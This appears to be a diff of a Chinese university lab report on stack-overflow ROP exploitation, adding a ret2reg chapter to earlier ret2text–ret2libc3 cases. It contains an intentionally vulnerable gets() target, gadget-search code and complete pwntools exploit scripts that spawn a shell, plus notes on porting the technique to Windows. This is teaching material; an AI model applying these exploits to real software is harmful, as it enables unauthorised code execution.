@@ -17,8 +17,8 @@
 1. 理解 ELF 文件结构、程序的装入过程与虚拟内存布局，理解 `.text`、`.plt`、`.got`、`.bss`、栈等区域在利用中的作用。
 2. 理解 32 位 x86 的 `cdecl` 调用约定、`call/ret`、`leave` 指令与栈帧的形成过程，能够根据反汇编推导溢出偏移。
 3. 理解编译链接期防护机制 NX、PIE、Canary、RELRO 的原理与开关方式，能够在题目中识别并绕开它们。
-4. 复现课堂讲授的 4 类 ROP：ret2text、ret2shellcode、ret2syscall、ret2libc（含 ret2libc1/2/3 三个变体）。
-5. 以 ret2libc3 作为中级 ROP 案例，完成“泄漏 libc 基址 + 二次利用”的完整分析与不少于 4 页的 writeup。
+4. 复现课堂讲授的 4 类 ROP：ret2text、ret2shellcode、ret2syscall、ret2libc（含 ret2libc1/2/3 三个变体），共 6 个 basic ROP 案例。
+5. 自选中级 ROP 专题 **ret2reg**，完成“无需泄漏地址、借寄存器跳转执行 shellcode”的原理分析与不少于 4 页的 writeup，并给出两种 gadget 变体的可复现实现。
 
 ---
 
@@ -43,7 +43,7 @@
 # 构建镜像并进入容器（源码目录挂载到 /work）
 bash scripts/docker_run.sh
 
-# 容器内：编译 6 个靶程序，并复制 32 位 libc 供 ret2libc3 使用
+# 容器内：编译 7 个靶程序（6 个 basic ROP + 1 个中级 ret2reg），并复制 32 位 libc 供 ret2libc3 使用
 bash scripts/build_all.sh
 
 # 容器内：逐个运行利用脚本的自动验证模式
@@ -59,6 +59,9 @@ bash scripts/run_all.sh
 [ret2libc1] PASS  system@plt=0x80490b4 binsh=0x804c028
 [ret2libc2] PASS  gets@plt=0x8049094 pop_ebx=0x8049022 system@plt=0x80490b4 target=0x804c060
 [ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
+[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
+[ret2reg:call eax] PASS  gadget=0x804901d
+[ret2reg] PASS  ret_esp=0x80b10d8 call_eax=0x804901d
 [+] 全部利用成功
 ```
 
@@ -85,7 +88,8 @@ BASE    := -m32 -O0 -fno-stack-protector -fno-builtin -no-pie -mpreferred-stack-
 此外按题目需要追加：
 
 - ret2shellcode：`-z execstack`，使栈可执行；
-- ret2syscall：`-static`，把 libc 静态链入，保证 gadget 与 `int 0x80` 都落在同一文件内。
+- ret2syscall：`-static`，把 libc 静态链入，保证 gadget 与 `int 0x80` 都落在同一文件内；
+- ret2reg（中级专题）：`-static -z execstack`，静态链接提供 `push esp; ret` / `call eax` 等 gadget，栈可执行用于放置 shellcode。
 
 ---
 
@@ -111,6 +115,21 @@ ELF 可执行文件由 ELF 头、程序头表（Program Header Table）和若干
 - `.got`：全局偏移表。第一次调用后，GOT 表项中存放库函数的**真实地址**，因此 `write@got` 是绝佳的泄漏目标。
 - `.bss`：未初始化全局变量区，可写且地址固定（非 PIE），适合存放 `/bin/sh` 或第二阶段的链。
 - 栈：函数调用时由 `call` 压入返回地址，`ret` 弹出并跳转。覆盖栈上的返回地址即可劫持控制流。
+
+作为对照，Windows 下的 PE（Portable Executable）在结构上与 ELF 一一对应，但术语和细节不同。两者的对应关系如下表，可以看出“栈溢出 + 覆盖返回地址”这一漏洞机理与文件格式无关，差别只在于利用时复用的代码载体：
+
+| 概念 | ELF（Linux） | PE（Windows） |
+|---|---|---|
+| 文件头 | ELF Header（`e_ident` 魔数 `\x7fELF`） | DOS 头 + `IMAGE_NT_HEADERS`（`MZ` / `PE\0\0`） |
+| 段/节描述 | Program Header（`PT_LOAD`）、Section Header | Section Table（`.text` / `.rdata` / `.data` / `.idata`） |
+| 导入表 | `.got.plt` + 动态链接器延迟绑定 | `.idata` 导入表（IAT），由加载器一次性填充 |
+| 导出表 | 动态符号表（`.dynsym`） | `.edata` 导出表 |
+| 地址无关 | PIE（`-pie`） | ASLR + `/DYNAMICBASE`，重定位表 `.reloc` |
+| 栈保护 | Canary（`-fstack-protector`） | `/GS`（security cookie） |
+| 数据执行保护 | NX（`-z noexecstack`） | DEP（`/NXCOMPAT`） |
+| 典型利用 | ret2plt / ret2libc / ROP | ret2IAT / 虚拟保护绕过 / ROP |
+
+本实验在 Linux 上完成，但第 3.3、3.4 节讨论的“覆盖返回地址 → 复用已有指令片段”思路同样适用于 PE：Windows 上把 ELF 的 `ret2libc` 换成“调用 IAT 中已导入的 `WinExec`/`VirtualProtect`”，把 gadget 搜索对象换成 `kernel32.dll`/`ntdll.dll` 即可。二者唯一的实质差异是 PE 的栈帧通常包含 `/GS` cookie 与 SEH 异常处理链，因而额外的绕过点更多。
 
 ### 3.2 32 位栈帧与溢出偏移
 
@@ -350,19 +369,13 @@ chain = (
 
 **题目要点**：既没有 `system@plt`，也没有 `/bin/sh`，只有 `write@plt` 与 `gets`。开启了 ASLR，libc 每次加载的基址都不同。
 
-这是本实验的中级案例，详细 writeup 见第 5 章，这里先给出结论：
+它属于 CTF-wiki 的 **basic ROP**（ret2libc 系列）中的最后一题，也是本实验从“有现成函数可用”过渡到“需要信息泄漏”的关键一步。运行结果：
 
 ```
 [ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
 ```
 
----
-
-## 5. 中级 ROP 专题 writeup：ret2libc3 泄漏 libc 基址
-
-> 对应 CTF-wiki“中级 ROP”中的 ret2libc 思路：在无 `system` 符号、无 `/bin/sh`、开启 ASLR 的条件下，先泄漏一个已解析函数的真实地址，反推 libc 基址，再完成第二次利用。
-
-### 5.1 题目描述与难点
+#### 4.6.1 题目描述与难点
 
 靶程序源码：
 
@@ -393,7 +406,7 @@ int main(void) {
 
 可用的条件是：程序调用了 `write`，因此存在 `write@plt`，并且 `write` 在 GOT 中的表项会在第一次调用后填入真实地址。
 
-### 5.2 泄漏原理
+#### 4.6.2 泄漏原理
 
 `write` 的函数原型为：
 
@@ -411,7 +424,7 @@ binsh     = libc_base + offset_of("/bin/sh")
 
 这里的 `libc.symbols["write"]` 与 `/bin/sh` 的偏移来自**与靶程序运行环境完全一致的 libc 文件**。实验中由 `scripts/build_all.sh` 从容器内 `/lib32/libc.so.6` 复制到 `challenges/ret2libc3/libc.so.6`，保证偏移匹配。
 
-### 5.3 第一阶段：泄漏并返回 main
+#### 4.6.3 第一阶段：泄漏并返回 main
 
 利用偏移 108 覆盖返回地址，构造如下链：
 
@@ -441,7 +454,7 @@ def build_stage1(elf):
     ])
 ```
 
-### 5.4 读取泄漏值时的一个坑
+#### 4.6.4 读取泄漏值时的一个坑
 
 程序的执行顺序是：`gets(buf)` → `puts("done.")` → `main` 返回 → `write(1, write@got, 4)`。
 
@@ -455,7 +468,7 @@ write_addr = int.from_bytes(leak, "little")
 
 这是本实验调试过程中实际踩到的坑，修正后一次通过。
 
-### 5.5 第二阶段：计算并再次利用
+#### 4.6.5 第二阶段：计算并再次利用
 
 ```python
 libc = ELF("./libc.so.6", checksec=False)
@@ -470,7 +483,7 @@ p.sendline(payload2)
 
 第二阶段与 ret2libc1 完全相同，只是 `system` 与 `/bin/sh` 的地址换成了运行时计算值。
 
-### 5.6 完整脚本
+#### 4.6.6 完整脚本
 
 ```python
 def main() -> int:
@@ -493,7 +506,7 @@ def main() -> int:
     p.sendline(b"A" * OFFSET + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr))
 ```
 
-### 5.7 运行结果与分析
+#### 4.6.7 运行结果与分析
 
 ```
 [ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
@@ -504,12 +517,319 @@ def main() -> int:
 - `/bin/sh` 位于 `0x3ff68363`；
 - 第二次发送 payload 后成功拿到 shell，`id` 输出包含 `uid=`。
 
-### 5.8 本题的启示
+#### 4.6.8 本题的启示
 
 1. **泄漏是 ASLR 的天敌**：只要程序能把某个已解析库函数的真实地址输出出来，整个 libc 的布局就都已知了。
 2. **GOT 是可读的**：即使 Full RELRO 把 GOT 设为只读，也只是不能写，读取仍然允许；因此 ret2libc 类泄漏在 Full RELRO 下依然有效。
 3. **返回 `main` 实现多阶段**：一次溢出只能写有限字节，返回 `main` 可以重新获得一次输入机会，把一次利用拆成多轮。
 4. **libc 必须匹配**：本地实验用容器内的 `/lib32/libc.so.6`；真实 CTF 中通常用题目提供的 libc，或用 libc-database 按低 12 位反查版本。
+
+至此，CTF-wiki 的 6 个 basic ROP 案例全部复现完毕。但 basic ROP 的共同前提是**知道要跳转的确切地址**（后门函数、buf 地址、gadget、libc 符号）。当缓冲区地址随机且程序不泄漏任何地址时，就需要进入中级 ROP，下一章给出本实验选做的中级专题。
+
+---
+
+## 5. 中级 ROP 专题 writeup：ret2reg
+
+> 对应 CTF-wiki“中级 ROP（medium-rop）”中的 **ret2reg**：把返回地址指向一条 `jmp reg` / `call reg` 类指令，借助寄存器中已经指向缓冲区的值完成跳转，从而**不需要知道栈或缓冲区的绝对地址**。
+
+### 5.1 为什么选择 ret2reg 作为中级专题
+
+CTF-wiki 把中级 ROP 概括为 ret2csu、ret2reg、JOP、COP、BROP 等几类，它们的共同特征是**在 basic ROP 的“直接跳到已知地址”之外，额外解决一个问题**：
+
+| 技术 | 要解决的问题 | 依赖条件 |
+|---|---|---|
+| ret2csu | 找不到 `pop rdi; pop rsi; ...; ret` 时如何给函数传参 | `__libc_csu_init` 中的通用 gadget |
+| **ret2reg** | **缓冲区地址未知（ASLR / 不打印地址）时如何跳到自己的数据** | 某个寄存器恰好指向缓冲区 |
+| JOP | 没有以 `ret` 结尾的 gadget 时如何串起执行流 | `jmp reg` 风格的 dispatch gadget |
+| COP | 只允许 `call` 的场景 | `call reg` 链 |
+| BROP | 二进制不可得（blind） | 可反复重启的服务 + 栈溢出 |
+
+选择 ret2reg 的理由是：它正好补上本实验前 6 题的空缺。ret2shellcode（4.2）虽然也执行栈上代码，但脚本必须先从输出中拿到 `buf` 的地址；而 ret2reg **一行地址泄漏都不需要**，它利用的是“函数返回值本来就指向缓冲区”这一编译器行为，在开启 ASLR 且程序不打印任何地址时依然稳定。它同时用到寄存器、gadget 字节搜索和 shellcode，是承上启下的一题。
+
+### 5.2 题目设计与防护配置
+
+靶程序 `challenges/ret2reg/src.c`：
+
+```c
+#include <stdio.h>
+
+void vuln(void) {
+    char buf[100];
+    gets(buf);
+}
+
+int main(void) {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== ret2reg ===");
+    puts("input:");
+    vuln();
+    puts("done.");
+    return 0;
+}
+```
+
+编译参数在统一参数基础上再加两项：
+
+```make
+ret2reg/ret2reg: ret2reg/src.c
+	$(CC) $(BASE) -static -z execstack -o $@ $<
+```
+
+- `-static`：把 libc 静态链接进来，得到一个约 700 KB 的二进制，里面有足够多的 `push esp; ret` / `call eax` 字节序列；配合 `-no-pie` 让代码地址固定。
+- `-z execstack`：栈可执行，shellcode 才能放在 `buf` 里运行。
+- Canary、PIE 均关闭，ASLR 保持系统默认开启。
+
+这里有一个容易误判的点：`checksec` 对这个静态二进制会报告 `Canary found`。这是**误报**——静态链接把 libc 中的 `__stack_chk_fail` 一起带进来了，而 checksec 只按符号名判断。查看 `vuln` 的反汇编即可确认函数序言中没有 `mov eax, gs:0x14` 一类的 cookie 读写：
+
+```asm
+08049df5 <vuln>:
+ 8049df9:  55                    push   ebp
+ 8049dfa:  89 e5                 mov    ebp,esp
+ 8049dfc:  53                    push   ebx
+ 8049dfd:  83 ec 64              sub    esp,0x64
+ 8049e0a:  8d 55 98              lea    edx,[ebp-0x68]   ; buf
+ 8049e0d:  52                    push   edx
+ 8049e10:  e8 cb 7d 00 00        call   8051be0 <_IO_gets>
+ 8049e15:  83 c4 04              add    esp,0x4
+ 8049e19:  8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
+ 8049e1c:  c9                    leave
+ 8049e1d:  c3                    ret
+```
+
+### 5.3 核心原理：让寄存器替我们“报地址”
+
+`gets` 的返回值是读到的字符串首地址，也就是 `buf`；在 cdecl 调用约定下返回值放在 `eax`。上面的反汇编显示，`gets` 返回后只执行了 `add esp,4`、`nop`、`mov ebx,[ebp-4]`、`leave`、`ret`，**没有任何指令改写 `eax`**，因此执行到 `ret` 时：
+
+```
+eax = buf 的地址
+esp = 指向返回地址槽（payload 的第 109~112 字节）
+```
+
+于是有两条不需要栈地址的路径：
+
+1. 返回地址改成 `jmp eax` / `call eax`：直接跳到 `buf` 开头执行 shellcode；
+2. 返回地址改成 `jmp esp` / `push esp; ret`：此时 `esp` 正指向返回地址之后的位置，只要 shellcode 紧跟返回地址，就会落到 shellcode 上。
+
+这就是 ret2reg 的本质：**不“知道”地址，而是让寄存器在运行时把地址送过来**。
+
+与 4.2 的 ret2shellcode 对比：
+
+| | ret2shellcode | ret2reg |
+|---|---|---|
+| 是否需要泄漏 | 需要，脚本先 `recv` 出 buf 地址 | 不需要 |
+| 返回地址写什么 | `buf` 的绝对地址 | gadget 地址（`jmp/call/push` 寄存器） |
+| ASLR 影响 | 栈地址随机 → 必须泄漏 | 栈地址随机也无所谓 |
+| 对程序的要求 | 打印 buf 地址 | 某个寄存器在 `ret` 前指向 buf |
+
+### 5.4 栈布局与偏移实测
+
+`buf` 位于 `ebp-0x68`（即 `ebp-104`），`push ebx` 又让栈帧多出 4 字节保存区，因此栈布局为：
+
+```
+高地址
+        +------------------+
+ebp+8   | 调用者参数   ...  |
+ebp+4   | 返回地址          |  <-- offset 108，溢出目标
+ebp+0   | saved ebp         |  <-- offset 104
+ebp-4   | saved ebx         |  <-- offset 100
+ebp-8   | 填充 / 对齐       |  <-- offset 96..99（buf 声明 100 字节）
+  ...   | buf               |
+ebp-0x68| buf[0]            |  <-- 写入起点
+        +------------------+
+低地址
+```
+
+因此 `OFFSET = 108`：100 字节 `buf` + 4 字节对齐填充 + 4 字节 saved ebx + 4 字节 saved ebp。脚本中统一写成：
+
+```python
+OFFSET = 108  # buf[100] + saved ebx(4) + saved ebp(4)
+```
+
+需要注意：payload 覆盖了 saved ebx，函数尾声的 `mov ebx,[ebp-4]` 会把 `ebx` 恢复成 `0x41414141`。本利用在 `ret` 之后立刻进入 gadget 与 shellcode，不再执行依赖 `ebx` 的 PIC 代码，所以不影响结果；但如果 gadget 之后还要返回 libc 函数，就必须注意 `ebx` 已被破坏（这是静态链接 + `-mpreferred-stack-boundary=2` 带来的额外约束）。
+
+### 5.5 gadget 搜索：为什么不能硬编码，以及 0x0a 的坑
+
+不同环境下编译出的地址不同，脚本因此**在运行时从 ELF 的可执行段中按机器码搜索 gadget**，而不是写死地址：
+
+```python
+def search_all(elf, pattern):
+    hits = []
+    for seg in elf.segments:
+        if seg.header.p_type != "PT_LOAD" or not (seg.header.p_flags & 1):
+            continue                      # 只搜可执行段
+        data = elf.read(seg.header.p_vaddr, seg.header.p_filesz)
+        idx = data.find(pattern)
+        while idx != -1:
+            addr = seg.header.p_vaddr + idx
+            if b"\n" not in p32(addr) and b"\r" not in p32(addr):
+                hits.append(addr)          # 过滤地址中含换行的命中
+            idx = data.find(pattern, idx + 1)
+    return hits
+```
+
+这里有一个本实验实际踩到的坑。`gets` 以换行符结束读取，payload 通过管道发送时末尾必须是 `\n`；如果 gadget 地址的 4 个字节里含有 `0x0a`，`gets` 会在读到该字节时提前结束，返回地址只被覆盖了一部分，利用必然失败。
+
+最初按 `push esp; ret`（机器码 `54 c3`）搜到的第一个命中是 `0x080b070a`，其小端表示为 `0a 07 0b 08`——首字节就是 `0x0a`：
+
+```
+>>> search_all(elf, b"\x54\xc3")
+[0x80b070a, 0x80b10d8]
+```
+
+第一版脚本没有过滤，结果是 `[ret2reg:push esp;ret] FAIL gadget=0x80b070a`。加入 `\n`/`\r` 过滤后取到第二个命中 `0x080b10d8`（小端 `d8 10 0b 08`，无换行），通过。
+
+gadget 搜索的实测结果如下（均已过滤掉含换行的地址）：
+
+| 机器码 | 指令 | 命中地址 | 本实验是否可用 |
+|---|---|---|---|
+| `54 c3` | `push esp; ret` | `0x080b070a`（含 0x0a） / `0x080b10d8` | 用后者 |
+| `ff e4` | `jmp esp` | 无 | 不存在，故回退到 `push esp;ret` |
+| `ff d0` | `call eax` | `0x0804901d` 等 | 用 |
+| `ff e0` | `jmp eax` | `0x080533bb` 等 | 备选 |
+| `ff e1` | `jmp ecx` | `0x0804f6be` 等 | 未使用 |
+
+注意 `jmp esp`（`ff e4`）在这个二进制中**完全不存在**，这正是脚本采用“优先 `jmp esp`、否则回退 `push esp; ret`”双分支的原因：`push esp` 把当前 `esp` 压栈，紧接着的 `ret` 又把这个值弹回 `eip`，效果等价于 `jmp esp`，只是多消耗 4 字节栈空间，不影响利用。
+
+### 5.6 变体一：`push esp; ret` → shellcode
+
+payload 结构：
+
+```
+[ 108 字节填充 ][ gadget 地址 ][ shellcode ]
+                 ↑ 返回地址    ↑ esp 在 ret 后正好指向这里
+```
+
+代码：
+
+```python
+def payload_ret_esp(elf):
+    gadget = find_bytes(elf, b"\xff\xe4") if search_all(elf, b"\xff\xe4") \
+        else find_bytes(elf, b"\x54\xc3")
+    shellcode = asm(shellcraft.i386.linux.sh())   # 44 字节
+    return b"A" * OFFSET + p32(gadget) + shellcode, gadget
+```
+
+执行时序：
+
+1. `vuln` 的 `ret` 弹出 gadget 地址，`esp` 上移 4 字节，指向 shellcode 首字节；
+2. `push esp` 把这个“指向 shellcode 的指针”压栈，`esp` 下移 4；
+3. `ret` 弹出该指针作为 `eip`，CPU 从 shellcode 首字节开始执行；
+4. shellcode 执行 `execve("/bin/sh", 0, 0)`，拿到 shell。
+
+本实验中该变体实测：
+
+```
+[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
+```
+
+### 5.7 变体二：`call eax` → shellcode
+
+`call eax` 等价于 `push 下一条指令地址; jmp eax`，它会把 shellcode 的**返回地址**压栈，因此 shellcode 必须放在 `buf` 开头，gadget 放在返回地址处：
+
+```
+[ shellcode ][ 90 90 ... 填充到 108 字节 ][ call eax 地址 ]
+```
+
+代码：
+
+```python
+def payload_call_eax(elf):
+    gadget = find_bytes(elf, b"\xff\xd0")   # call eax
+    shellcode = asm(shellcraft.i386.linux.sh())
+    return shellcode.ljust(OFFSET, b"\x90") + p32(gadget), gadget
+```
+
+使用 `call` 而非 `jmp` 的另一个理由：`call eax` 会压入返回地址，shellcode 末尾若执行 `ret` 可以回到 `call` 的下一条指令；本实验中 shellcode 直接 `execve` 替换了进程，不会返回，所以这一点不影响，但在“shellcode 只有一段、之后还要继续 ROP”的场景里，`call` 能自然接回原链。
+
+另一个细节是 `vuln` 被设计为 `void vuln(void)`，而不是把溢出写在 `main` 里。最初把溢出放在 `main` 中，`call eax` 一直失败——因为 `main` 的 `return 0` 会把 `eax` 写成 0，再 `ret` 时 `eax` 已不再指向 `buf`。把溢出移入 `void` 函数后，`gets` 的返回值一直保留到 `leave; ret`，变体二一次通过。这说明 ret2reg 的**前提是精确掌握 `ret` 前各寄存器的状态**，不能想当然。
+
+### 5.8 完整利用脚本
+
+`challenges/ret2reg/exp.py` 的关键部分（完整文件见源码目录）：
+
+```python
+#!/usr/bin/env python3
+import sys
+from pwn import ELF, asm, context, p32, process, shellcraft
+
+context(os="linux", arch="i386", log_level="error")
+
+BINARY = "./ret2reg"
+CHECK = "--check" in sys.argv
+OFFSET = 108
+SHELLCODE = asm(shellcraft.i386.linux.sh())      # 44 字节
+
+
+def search_all(elf, pattern):
+    ...  # 见 5.5
+
+
+def payload_ret_esp(elf):
+    gadget = find_bytes(elf, b"\xff\xe4") if search_all(elf, b"\xff\xe4") \
+        else find_bytes(elf, b"\x54\xc3")
+    return b"A" * OFFSET + p32(gadget) + SHELLCODE, gadget
+
+
+def payload_call_eax(elf):
+    gadget = find_bytes(elf, b"\xff\xd0")
+    return SHELLCODE.ljust(OFFSET, b"\x90") + p32(gadget), gadget
+
+
+def main():
+    elf = ELF(BINARY, checksec=False)
+    ret_esp, addr1 = payload_ret_esp(elf)
+    call_eax, addr2 = payload_call_eax(elf)
+
+    if not CHECK:
+        p = process([BINARY])
+        p.recvuntil(b"input:")
+        p.sendline(ret_esp)
+        p.interactive()
+        return 0
+
+    ok = True
+    for name, payload, addr in (("push esp;ret", ret_esp, addr1),
+                                ("call eax", call_eax, addr2)):
+        p = process([BINARY])
+        p.recvuntil(b"input:")
+        p.sendline(payload)
+        p.sendline(b"id; exit")
+        out = p.recvall(timeout=3)
+        hit = b"uid=" in out
+        ok = ok and hit
+        print(f"[ret2reg:{name}] {'PASS' if hit else 'FAIL'}  gadget={addr:#x}")
+    print(f"[ret2reg] {'PASS' if ok else 'FAIL'}  ret_esp={addr1:#x} call_eax={addr2:#x}")
+    return 0 if ok else 1
+```
+
+`--check` 模式的判定方式：发送 payload 后再发送 `id; exit`，若输出中出现 `uid=`，说明 shell 已建立且能执行命令；两个变体都成功才算 PASS。
+
+### 5.9 运行结果
+
+```
+[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
+[ret2reg:call eax] PASS  gadget=0x804901d
+[ret2reg] PASS  ret_esp=0x80b10d8 call_eax=0x804901d
+```
+
+两个变体都不需要任何地址泄漏，在 ASLR 开启的情况下连续运行、每次重建进程均成功。
+
+### 5.10 调试记录与启示
+
+**记录 1：`jmp esp` 不存在。** 第一版脚本直接 `elf.search(b"\xff\xe4")` 并 `next()`，抛出 `StopIteration`。原因不是搜索写错，而是这个静态二进制里确实没有 `ff e4`。这说明“教科书上的经典 gadget 不一定存在”，脚本必须准备回退路径，或者换一个寄存器。
+
+**记录 2：`0x0a` 截断。** 见 5.5。`gets` 的终止条件与地址字节发生了冲突，这类问题在 ret2text 等题中不会出现，只有“payload 通过行缓冲输入”时才会暴露。通用做法是：搜索 gadget 时就把“地址字节不含 `\n`/`\r`”作为过滤条件，而不是事后修补。
+
+**记录 3：`eax` 被 `return 0` 清掉。** 见 5.7。寄存器状态要顺着反汇编逐条确认，不能只看“`gets` 返回 `eax`”这一条结论。
+
+**记录 4：`checksec` 误报 Canary。** 静态链接程序的 `__stack_chk_fail` 符号会误导 checksec 和 pwntools，最终以反汇编是否有 `gs:0x14` 读操作作为判据。
+
+启示可以归结为三点：
+
+1. **地址的来源不止“泄漏”一种**。ret2reg 展示了一条重要思路：程序自身的寄存器、栈、返回值都在“替你保存地址”，利用者要做的是找到一条把控制流导过去的 gadget。这也是后续 JOP/COP 的基础。
+2. **gadget 搜索要带约束**。可执行段、地址字节、指令语义三者都要检查，缺一不可；写死地址的脚本换一个编译环境就会失效。
+3. **中级 ROP 的难点往往在“环境细节”**。`gets` 的换行、`return 0` 对 `eax` 的改写、静态链接带来的符号误报，这些都不属于 ROP 理论，却直接决定利用成败。真实漏洞利用中，这类细节排查所占的时间通常远多于构造链本身。
 
 ---
 
@@ -558,19 +878,20 @@ def find_bytes(elf, pattern, name):
 | PIE | 代码与 `.bss` 地址随机 | 全部题目 `-no-pie`，符号地址固定 | 泄漏代码地址（如返回地址、`__libc_start_main` 相关地址） |
 | Canary | 覆盖返回地址前会校验 | 全部题目关闭 | 泄漏 canary；覆盖 TLS 中的 canary；fork 场景下爆破 |
 | RELRO | Full 时 GOT 只读 | 默认 Partial，GOT 可写 | 读 GOT 做泄漏（ret2libc）；改写其它函数指针 |
-| ASLR | libc/栈/堆基址随机 | ret2libc3 通过 `write@got` 泄漏 | 信息泄漏 + 一次计算，后续地址全部可知 |
+| ASLR | libc/栈/堆基址随机 | ret2libc3 通过 `write@got` 泄漏；ret2reg 完全不需要栈地址 | 信息泄漏 + 一次计算；或改用寄存器间接跳转（ret2reg） |
 
-可以看到，现代防护往往是**组合**出现的：NX + ASLR + PIE + Canary + Full RELRO。此时单一技巧不再够用，需要“先泄漏、再 ROP、必要时多阶段”的组合拳，这正是本实验从 ret2text 到 ret2libc3 逐步逼近的场景。
+可以看到，现代防护往往是**组合**出现的：NX + ASLR + PIE + Canary + Full RELRO。此时单一技巧不再够用，需要“先泄漏、再 ROP、必要时多阶段”的组合拳，这正是本实验从 ret2text 到 ret2libc3 逐步逼近的场景；而 ret2reg 进一步说明，即使一个字节都泄漏不出来，寄存器与 gadget 仍可能提供可利用的跳转。
 
 ---
 
 ## 8. 实验结论
 
 1. 通过 6 个递进案例，完整复现了课堂要求的 4 类 ROP：ret2text、ret2shellcode、ret2syscall、ret2libc（3 个变体），全部利用脚本在统一环境中运行通过。
-2. 掌握了从源码与反汇编推导栈帧、计算溢出偏移的方法；本实验所有题目的返回地址偏移均为 108 字节，并已通过直接 ret 到后门函数验证。
-3. 理解了 gadget 的本质与搜索方法：既可以使用 pwntools/ROPgadget，也可以在可执行段中按机器码字节搜索，后者在静态大二进制中更可靠。
-4. 以 ret2libc3 为例完成了中级 ROP 的完整分析：泄漏 `write@got`、计算 libc 基址、返回 `main` 二次利用，并记录了 `recvn` 误读 `done.` 等真实调试问题。
-5. 加深了对 NX、PIE、Canary、RELRO、ASLR 的理解：防护的本质是提高“地址未知”与“数据不可执行”的门槛，而泄漏与代码复用是两类最通用的应对手段。
+2. 在此之上完成中级 ROP 专题 ret2reg：用 `push esp; ret` 与 `call eax` 两种 gadget，在不泄漏任何地址的情况下执行栈上 shellcode，两个变体均自动验证通过，共 7 个案例全部 PASS。
+3. 掌握了从源码与反汇编推导栈帧、计算溢出偏移的方法；本实验所有题目的返回地址偏移均为 108 字节，并已通过直接 ret 到后门函数验证。
+4. 理解了 gadget 的本质与搜索方法：既可以使用 pwntools/ROPgadget，也可以在可执行段中按机器码字节搜索，后者在静态大二进制中更可靠；搜索时还必须排除地址中含 `0x0a` 的命中，否则会被 `gets` 截断。
+5. 以 ret2libc3 与 ret2reg 两个案例，分别覆盖了“泄漏 + 二次利用”和“寄存器间接跳转”两条中级思路，并记录了 `recvn` 误读 `done.`、`return 0` 清空 `eax`、`jmp esp` 不存在等真实调试问题。
+6. 加深了对 NX、PIE、Canary、RELRO、ASLR 的理解：防护的本质是提高“地址未知”与“数据不可执行”的门槛，而泄漏、代码复用与寄存器间接跳转是三类最通用的应对手段。
 
 ---
 
@@ -585,7 +906,8 @@ def find_bytes(elf, pattern, name):
 │   ├── ret2syscall/     src.c  exp.py
 │   ├── ret2libc1/       src.c  exp.py
 │   ├── ret2libc2/       src.c  exp.py
-│   └── ret2libc3/       src.c  exp.py  libc.so.6（构建时复制）
+│   ├── ret2libc3/       src.c  exp.py  libc.so.6（构建时复制）
+│   └── ret2reg/         src.c  exp.py（中级专题，两种 gadget 变体）
 ├── docker/Dockerfile
 ├── docs/report.md
 └── scripts/
